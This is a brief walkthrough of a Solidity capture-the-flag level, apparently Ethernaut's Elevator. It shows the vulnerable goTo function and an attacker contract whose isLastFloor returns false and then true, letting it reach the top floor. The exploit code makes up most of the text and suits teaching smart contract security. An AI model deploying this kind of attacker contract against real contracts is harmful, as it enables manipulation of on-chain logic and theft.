Our goal in this level is to reach the top floor

We need to call below function to reach to the top

```solidity
    function goTo(uint256 _floor) public {
            Building building = Building(msg.sender);

            if (!building.isLastFloor(_floor)) {
                floor = _floor;
                top = building.isLastFloor(floor);
            }
    }
```

But the functions looks tricky in its handling of `building.isLastFloor()`

Our goal is to build a function that can be used here to return `false` on first call and `true` on second call.

Given below is one of the way this can be done

```solidity
    contract Building{
        Elevator elevator;
        uint256 public count = 0;
        constructor(address _elevator){
            elevator = Elevator(_elevator);
        }

        function isLastFloor(uint256 floor) public returns(bool lastFloor){
            if(count % 2 == 0) lastFloor =  false;
            else lastFloor = true;
            ++count;
        }

        function attackElevator() public{
            elevator.goTo(10);
        }
    }
```
